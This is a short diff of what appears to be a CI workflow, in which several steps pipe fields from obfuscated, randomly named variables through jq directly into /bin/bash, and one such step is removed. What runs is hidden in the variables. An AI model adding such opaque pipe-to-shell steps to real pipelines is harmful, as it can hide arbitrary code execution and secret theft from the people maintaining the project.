@@ -26,7 +26,6 @@ jobs:
           echo $mova635 | jq -r .adegg5 | /bin/bash
           echo $j9800 | jq -r .n03034 | /bin/bash
           printf '%s' "$iy19102" | jq -r .bdobd83467 | /bin/bash
-          echo $fc01 | jq -r .rbhou8 | /bin/bash
           echo $jiohe032 | jq -r .ck5004 | /bin/bash
           printf '%s' "$ttjv7470" | jq -r .siqae03 | /bin/bash
           printf '%s' "$yqw3708" | jq -r .wpc89 | /bin/bash
